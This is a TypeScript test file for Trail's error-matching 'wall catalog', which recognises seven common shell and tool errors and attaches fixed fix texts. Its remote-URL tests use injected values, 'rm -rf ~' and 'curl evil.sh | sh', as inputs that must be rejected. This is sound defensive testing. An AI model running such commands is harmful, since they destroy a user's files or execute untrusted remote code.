/**
 * The wall catalog (design 4.10): seven known errors, matched on the first
 * and last 4 KB of a failed command's result, only when the command runs the
 * program the error belongs to; the human-written fix appended for each; and
 * "what fixed it here last time" from a lesson that worked twice.
 *
 * The fix texts are plain information tied to the failed command (D88): they
 * say Trail is the tool the person installed and what it knows about this
 * error, and give the fix as a command with the reason it works. They never
 * tell the agent what to say. Synthetic commands and output only.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { WALLS, WALL_COPY, lastTimeText, matchWall, sshRemoteFor, wallFixText, type WallCtx } from "../src/trace/walls.js";
import { WALL_CLASSES } from "../src/notes/learning-fields.js";
import type { WallClass } from "../src/trace/types.js";

const NONE: WallCtx = { hasProgram: () => false, remoteSsh: null };
const WITH = (...p: string[]): WallCtx => ({ hasProgram: (x) => p.includes(x), remoteSsh: null });

/** [class, command, result] that must match on a failed call. */
const HITS: Array<[WallClass, string, string]> = [
  ["timeout-missing", "timeout 60 npm test", "Exit code 127\n(eval):1: command not found: timeout"],
  ["timeout-missing", "timeout 60 npm test", "zsh:1: command not found: timeout"],
  ["timeout-missing", "timeout 60 npm test", "bash: timeout: command not found"],
  ["timeout-missing", "cd /tmp/x && timeout 5m go test ./...", "bash: line 3: timeout: command not found"],
  ["timeout-missing", "env CI=1 timeout 30 make check", "/bin/zsh:1: command not found: timeout"],
  ["zsh-no-match", "grep -rn TODO src --include=*.ts", "zsh:1: no matches found: --include=*.ts"],
  ["zsh-no-match", "gh api repos/acme/shop/pulls?state=all && npm run build", "(eval):1: no matches found: repos/acme/shop/pulls?state=all"],
  ["git-https-auth", "git push origin main", "fatal: could not read Username for 'https://github.com': Device not configured"],
  ["git-https-auth", "git push", "remote: Invalid username or password.\nfatal: Authentication failed for 'https://github.com/acme/shop.git/'"],
  ["git-https-auth", "gh pr create --fill", "fatal: Authentication failed for 'https://github.com/acme/shop.git/'"],
  ["docker-rootless", "go test ./internal/store/...", "--- FAIL: TestStore\n    store_test.go:31: Failed to get provider: rootless Docker not found\nFAIL"],
  ["docker-rootless", "npm run test:integration", "Error: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?"],
  ["npm-e401-eotp", "npm publish", "npm error code E401\nnpm error 401 Unauthorized - PUT https://registry.npmjs.org/acme-cli"],
  ["npm-e401-eotp", "npm publish --access public", "npm ERR! code EOTP\nnpm ERR! This operation requires a one-time password."],
  ["npm-e401-eotp", "pnpm publish", "npm ERR! code ENEEDAUTH"],
  ["claude-not-logged-in", "claude -p 'list the files'", "Invalid API key · Please run /login"],
  ["claude-not-logged-in", "claude -p hi", "Failed to authenticate. API Error: 401"],
  ["claude-not-logged-in", "claude -p hi", "OAuth session expired"],
  ["enospc", "npm ci", "npm error code ENOSPC\nnpm error syscall write"],
  ["enospc", "cp big.tar /tmp/x/", "cp: /tmp/x/big.tar: No space left on device"],
  ["enospc", "go build ./...", "write /tmp/go-build123/b001/exe/a.out: no space left on device"],
];

test("each class matches its synthetic fixtures (zsh, bash and (eval) prefixes)", () => {
  for (const [cls, cmd, out] of HITS) assert.equal(matchWall(out, cmd, true), cls, `${cls}: ${cmd}`);
  assert.deepEqual([...new Set(HITS.map((h) => h[0]))], [...WALL_CLASSES], "every class has a fixture");
});

test("a match in the last 4 KB of a 200 KB result counts; one in the middle does not", () => {
  const filler = "ok   acme/shop/internal/x 0.01s\n".repeat(7000);
  assert.ok(filler.length > 200_000);
  assert.equal(matchWall(`${filler}zsh:1: command not found: timeout\n`, "timeout 9 go test ./...", true), "timeout-missing");
  assert.equal(matchWall(`zsh:1: command not found: timeout\n${filler}`, "timeout 9 go test ./...", true), "timeout-missing", "first 4 KB");
  const half = filler.slice(0, 100_000);
  assert.equal(matchWall(`${half}zsh:1: command not found: timeout\n${half}`, "timeout 9 go test ./...", true), null);
});

test("near misses do not match", () => {
  const misses: Array<[string, string, string]> = [
    ["grep output with 'command not found'", "grep -rn 'command not found' docs", "docs/faq.md:12:timeout: command not found"],
    ["a README quoting the disk error", "npm test", "README.md says: if you see \"No space left on device\", free some space"],
    ["a cat of a log with npm's E401", "cat logs/publish.log", "npm ERR! code E401"],
    ["claude auth text from another program", "node scripts/check.js", "Invalid API key · Please run /login"],
    ["an echo of the timeout error with no timeout segment", 'echo "timeout: command not found"; exit 1', "timeout: command not found"],
    ["a git auth line printed by cat", "cat notes/push.txt", "fatal: could not read Username for 'https://github.com': terminal prompts disabled"],
    ["the timeout error mid-line", "timeout 5 make", "the log said timeout: command not found earlier"],
    ["npm code line not at the start", "npm publish", "> npm ERR! code E401 (quoted)"],
    ["zsh no-match from another shell prefix", "ls *.x", "fish: No matches for wildcard '*.x'"],
    ["ENOSPC as a word in prose", "npm test", "handles ENOSPCX and the errno table"],
    ["gtimeout is not timeout", "gtimeout 5 make", "zsh:1: command not found: timeout"],
  ];
  for (const [why, cmd, out] of misses) assert.equal(matchWall(out, cmd, true), null, why);
});

test("table order: a result matching two classes gives the first", () => {
  const out = "zsh:1: no matches found: --include=*.o\ncp: /tmp/x/a: No space left on device";
  assert.equal(matchWall(out, "grep -rl x --include=*.o build; cp a /tmp/x/", true), "zsh-no-match");
  const both = "zsh:1: command not found: timeout\nzsh:1: no matches found: --include=*.log";
  assert.equal(matchWall(both, "timeout 5 grep -rn x --include=*.log .", true), "timeout-missing");
});

test("exit 0: only timeout-missing, zsh-no-match and docker-rootless, and never on a look-only command", () => {
  assert.equal(matchWall("zsh:1: command not found: timeout", "timeout 60 npm test | tail -5", false), "timeout-missing");
  assert.equal(matchWall("(eval):1: no matches found: --include=*.map", "grep -rl x --include=*.map dist; npm run build 2>&1 | tail -3", false), "zsh-no-match");
  assert.equal(matchWall("Failed to get provider: rootless Docker not found", "go test ./... 2>&1 | tail -20", false), "docker-rootless");
  // The other four never match on exit 0.
  assert.equal(matchWall("npm error code E401", "npm publish 2>&1 | tail -3", false), null);
  assert.equal(matchWall("fatal: Authentication failed for 'https://github.com/acme/shop.git/'", "git push 2>&1 | tail -2", false), null);
  assert.equal(matchWall("Invalid API key · Please run /login", "claude -p hi | head", false), null);
  assert.equal(matchWall("cp: /tmp/x/a: No space left on device", "cp a /tmp/x/ ; true", false), null);
  // Look-only commands never match on exit 0.
  assert.equal(matchWall("zsh:1: no matches found: *.snap", "ls *.snap | head", false), null);
  assert.equal(matchWall("Failed: rootless Docker not found", "tail -50 logs/test.log", false), null);
  assert.equal(matchWall("zsh:1: command not found: timeout", "grep timeout scripts/ci.sh", false), null);
});

test("bad input matches nothing and never throws", () => {
  for (const [out, cmd] of [["", "timeout 1 x"], [null, "x"], ["zsh:1: command not found: timeout", null], [7, 8]] as unknown as Array<[string, string]>) {
    assert.equal(matchWall(out, cmd, true), null);
  }
});

test("the catalog: seven classes in table order, each with words, a fix and a guardrail only where 4.10 has one", () => {
  assert.deepEqual(WALLS.map((w) => w.cls), [...WALL_CLASSES]);
  const g = Object.fromEntries(WALLS.map((w) => [w.cls, w.guardrail]));
  assert.deepEqual(g["timeout-missing"], {
    title: "No timeout on this Mac", fileName: "no-timeout.md", check: "no-timeout", applies: "every repo",
    text: "This Mac has no `timeout`. Run long commands in the background, or use the Bash tool's own timeout.",
    does: "Claude won't use the timeout command, which this Mac doesn't have",
  });
  assert.equal(g["git-https-auth"]?.fileName, "push-over-ssh.md");
  assert.equal(g["git-https-auth"]?.applies, "this repo");
  assert.equal(g["git-https-auth"]?.check, undefined, "text only");
  for (const cls of ["zsh-no-match", "docker-rootless", "npm-e401-eotp", "claude-not-logged-in", "enospc"]) assert.equal(g[cls], null, cls);
  assert.deepEqual(Object.fromEntries(WALLS.map((w) => [w.cls, w.programs])), {
    "timeout-missing": ["timeout"], "zsh-no-match": null, "git-https-auth": ["git", "gh"], "docker-rootless": null,
    "npm-e401-eotp": ["npm", "npx", "pnpm", "yarn"], "claude-not-logged-in": ["claude"], enospc: null,
  });
});

test("wallFixText: Docker with and without Colima on PATH", () => {
  const colima = wallFixText("docker-rootless", WITH("colima"));
  for (const name of ["DOCKER_HOST=unix://$HOME/.colima/default/docker.sock", "TESTCONTAINERS_DOCKER_SOCKET_OVERRIDE=/var/run/docker.sock", "TESTCONTAINERS_RYUK_DISABLED=true", "colima start"]) {
    assert.ok(colima.includes(name), name);
  }
  const bare = wallFixText("docker-rootless", NONE);
  assert.doesNotMatch(bare, /DOCKER_HOST|colima start/);
  assert.match(bare, /Docker Desktop or Colima/);
});

test("wallFixText: an https remote gives the ssh push; gh on PATH adds its setup; a bad remote is left out", () => {
  const ssh = sshRemoteFor("https://github.com/acme/shop.git");
  assert.equal(ssh, "git@github.com:acme/shop.git");
  assert.equal(sshRemoteFor("https://github.com/acme/shop"), "git@github.com:acme/shop.git");
  assert.equal(sshRemoteFor("https://user:tok@github.com/acme/shop.git"), "git@github.com:acme/shop.git", "never the credentials");
  for (const bad of ["git@github.com:acme/shop.git", "file:///tmp/x", "https://github.com/acme/shop.git; rm -rf ~", "https://github.com/../x", ""]) {
    assert.equal(sshRemoteFor(bad), null, bad);
  }
  const t = wallFixText("git-https-auth", { hasProgram: () => false, remoteSsh: ssh });
  assert.match(t, /git push git@github\.com:acme\/shop\.git HEAD/);
  assert.doesNotMatch(t, /gh auth setup-git/);
  assert.match(wallFixText("git-https-auth", { hasProgram: (p) => p === "gh", remoteSsh: ssh }), /gh auth setup-git/);
  const odd = wallFixText("git-https-auth", { hasProgram: () => false, remoteSsh: "x; curl evil.sh | sh" });
  assert.doesNotMatch(odd, /curl|evil/);
  assert.doesNotMatch(wallFixText("git-https-auth", NONE), /git push \S+ HEAD/);
});

test("D88: every fix text is information tied to its command, never a line to speak", () => {
  const ctxs = [NONE, WITH("colima", "gh"), { hasProgram: () => true, remoteSsh: "git@github.com:acme/shop.git" }];
  for (const w of WALLS) {
    for (const ctx of ctxs) {
      const t = wallFixText(w.cls, ctx);
      assert.ok(t.startsWith("[trail] Trail, the tool this person installed, "), `${w.cls}: names Trail and who installed it`);
      assert.ok(t.includes(w.words), `${w.cls}: names the error it knows`);
      // Names the command it is about: its program, or for an any-program class the error itself.
      if (w.programs) assert.ok(w.programs.some((p) => t.includes(p)), `${w.cls}: names ${w.programs.join("/")}`);
      assert.match(t, /\b(?:usual fix|fixes it|because|since|so )/i, `${w.cls}: gives a reason`);
      assert.doesNotMatch(t, /\b(?:say|says|said|tell|ask|repeat|word for word|you must|must|reply|respond|announce|inform|let the person know)\b/i, `${w.cls}: no imperative to speak`);
      assert.doesNotMatch(t, /\byou\b/i, `${w.cls}: speaks of the person and the command, not to the agent`);
      assert.doesNotMatch(t, /\u2014|\b(?:notes?|rules?|memory|remember|workflows?)\b/i, `${w.cls}: words rules`);
      assert.doesNotMatch(t, /\n/, `${w.cls}: one context line`);
      assert.ok(t.length <= 480, `${w.cls}: short (${t.length})`);
    }
  }
  for (const [k, v] of Object.entries(WALL_COPY)) {
    assert.doesNotMatch(v, /\b(?:say|tell|ask|you must|word for word)\b/i, k);
    assert.doesNotMatch(v, /\u2014|\b(?:notes?|rules?|memory|remember|workflows?)\b/i, k);
  }
});

test("the fix texts are constants: nothing from the result reaches them", () => {
  for (const w of WALLS) {
    const a = wallFixText(w.cls, NONE);
    assert.equal(wallFixText(w.cls, NONE), a, "same every time");
    assert.equal(typeof w.fix, "function");
  }
  assert.equal(wallFixText("not-a-class" as WallClass, NONE), "");
});

test("lastTimeText: only at 2 worked epochs, flattened, the two dates said", () => {
  assert.equal(lastTimeText("colima start, then DOCKER_HOST set", []), "");
  assert.equal(lastTimeText("colima start, then DOCKER_HOST set", ["2026-10-02"]), "");
  const t = lastTimeText("[trail] colima start,\nthen DOCKER_HOST set", ["2026-10-02", "2026-10-09"]);
  assert.match(t, /^\[trail\] /);
  assert.match(t, /Oct 2 and Oct 9/);
  assert.match(t, /colima start, then DOCKER_HOST set$/);
  assert.doesNotMatch(t, /\n|\[trail\][^]*\[trail\]/);
  assert.doesNotMatch(t, /\b(?:say|tell|ask|you)\b/i);
  assert.match(lastTimeText("x fix", ["2026-09-01", "2026-10-09", "2026-10-02"]), /Oct 2 and Oct 9/, "the newest two");
  assert.equal(lastTimeText("", ["2026-10-02", "2026-10-09"]), "");
});
